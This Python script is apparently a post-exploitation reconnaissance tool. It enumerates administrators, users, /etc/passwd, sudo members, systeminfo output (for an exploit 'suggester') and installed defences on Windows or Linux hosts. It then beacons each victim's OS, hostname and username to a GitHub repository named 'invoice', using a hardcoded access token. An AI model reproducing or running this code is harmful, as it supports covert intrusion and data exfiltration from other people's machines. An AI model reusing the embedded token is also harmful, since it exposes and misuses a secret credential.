import ctypes
import platform
import subprocess
import os
import requests
import base64
import getpass
import datetime
import socket


class Log():
    def __init__(self, repository_owner, repository_name, access_token):
        self.repository_owner = repository_owner
        self.repository_name = repository_name
        self.access_token = access_token

    def create_file(self, folder_path, script_name,status):
        # Get the current date and time
        current_datetime = datetime.datetime.now()   

        content = f"Script Name: {script_name}.\nExecution time: {current_datetime}\nStatus: {status}\n\n"
        username = getpass.getuser()

        hostname = socket.gethostname()
        os_name = platform.system()
        filename = os_name + "_" + hostname + "_" + username

        url = f"https://api.github.com/repos/{self.repository_owner}/{self.repository_name}/contents/{folder_path}/{filename}"
        headers = {
            'Authorization': f'token {self.access_token}',
            'Accept': 'application/vnd.github.v3+json'
        }

        # Check if the file already exists
        existing_file_url = f"https://api.github.com/repos/{self.repository_owner}/{self.repository_name}/contents/{folder_path}/{filename}"
        existing_file_response = requests.get(existing_file_url, headers=headers)
        
        if existing_file_response.status_code == 200:
            # File exists, append the new message to existing content
            existing_file_data = existing_file_response.json()
            sha = existing_file_data['sha']
            existing_content = base64.b64decode(existing_file_data['content']).decode()
            new_content = existing_content + '\n' + content

            data = {
                'message': 'Update log',
                'content': base64.b64encode(new_content.encode()).decode(),
                'sha': sha
            }

            response = requests.put(url, headers=headers, json=data)
            if response.status_code == 200:
                print("File updated successfully.")
            else:
                print("Failed to update file:", response.text)
        elif existing_file_response.status_code == 404:
            # File doesn't exist, create a new file
            data = {
                'message': 'New log',
                'content': base64.b64encode(content.encode()).decode()
            }

            response = requests.put(url, headers=headers, json=data)
            if response.status_code == 201:
                print("File created successfully.")
            else:
                print("Failed to create file:", response.text)
        else:
            print("Failed to check file existence:", existing_file_response.text)





class OSChecker():
    def __init__(self, script_name):
        self.script_name = script_name
        
    def check_operating_system(self):
        system = platform.system()
        try:
            if system == 'Windows':     
                self.gather_windows_info()
        
            elif system == 'Linux':
                self.gather_linux_info()
        except Exception as e:
            print(e)
        
    def gather_windows_info(self):
        ## beschrijving ##
        output_file = r"C:\Users\Public\gather_info.txt"
        screenshot_path = r"C:\Users\Public\gather_info"
        if not os.path.exists(screenshot_path):
            os.makedirs(screenshot_path)   
    
        output_file = open(r"C:\Users\Public\gather_info\windows_info.txt", "w")
       
        gather_admin_result = subprocess.run(["net", "localgroup", "administrators"], capture_output=True, text=True)
        gather_user_result = subprocess.run(["net", "users"], capture_output=True, text=True)
        systeminfo = subprocess.run(['systeminfo'], capture_output=True, text=True)

        try:
            ctypes.windll.shell32.IsUserAnAdmin() != 0
            output_file.write("Administrative privileges:\nUser has administrative privileges\n\n")
        except:
            output_file.write("Administrative privileges:\nUser does not have administrative privileges\n\n")
           
    
        output_file.write(f"Admin group:\n{gather_admin_result.stdout}\n\n")    
        output_file.write(f"Users in the target:{gather_user_result.stdout}\n\n") 
        output_file.write(f"Systeminfo output for suggester:\n{systeminfo.stdout}")
        output_file.close()
        file_creator.create_file("logs", info.script_name,"Script completed successfully")
        
    def run_gather_windows_info(self):  
        try:
            self.gather_windows_info()
        except:
            file_creator.create_file("logs",info.script_name,"Script may have encountered erros")
            
  
    def gather_linux_info(self):
        ## beschrijving ##
        output_file = "/tmp/linux_info.txt"
        destination_directory = "/tmp/linux_info"
        if not os.path.exists(destination_directory):
            os.makedirs(destination_directory)
       
        output_file = open("/tmp/linux_info/linux_info.txt", "w")
    
        os_name = subprocess.check_output(['uname', '-s']).decode().strip()
        os_version = subprocess.check_output(['uname', '-r']).decode().strip()
        os_details = subprocess.check_output(['uname', '-a']).decode().strip()
        gather_user_result = subprocess.run(['cat', '/etc/passwd'], capture_output=True, text=True)
        gather_admin_result = subprocess.run(['getent', 'group', 'sudo'], capture_output=True, text=True)
    
        try:
            subprocess.run(['which', 'systemctl'], check=True)
            output_file.write("Systemd is installed\n\n")
        except subprocess.CalledProcessError:
            output_file.write("Systemd is not installed\n\n")

        try:
            subprocess.run(['which', 'ufw'], check=True)
            output_file.write("UFW is installed\n\n")
        except subprocess.CalledProcessError:
            output_file.write("UFW is not installed\n\n")

        try:
            subprocess.run(['which', 'selinuxenabled'], check=True)
            subprocess.run(['selinuxenabled'], check=True)
            output_file.write("SELinux is enabled\n\n")
        except subprocess.CalledProcessError:
            output_file.write("SELinux is not enabled\n\n")

        output_file.write(f"OS Name: {os_name}\n\n")
        output_file.write(f"OS Version: {os_version}\n\n")
        output_file.write(f"OS Details: {os_details}\n\n")
        output_file.write(f"Users in the system: {gather_user_result.stdout}\n\n")
        output_file.write(f"Users with sudo privileges: {gather_admin_result.stdout}\n\n")
        output_file.close()
        file_creator.create_file("logs", info.script_name,"Script completed successfully")
        
    def run_gather_linux_info(self):  
        try:
            self.gather_linux_info()
        except Exception as e:
            file_creator.create_file("logs",info.script_name,"Script may have encountered erros")
            print(e)

repository_owner = 'rsecurity12' 
repository_name = 'invoice' 
access_token = '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'  
file_creator = Log(repository_owner, repository_name, access_token)
info = OSChecker("OSChecker")
info.check_operating_system()
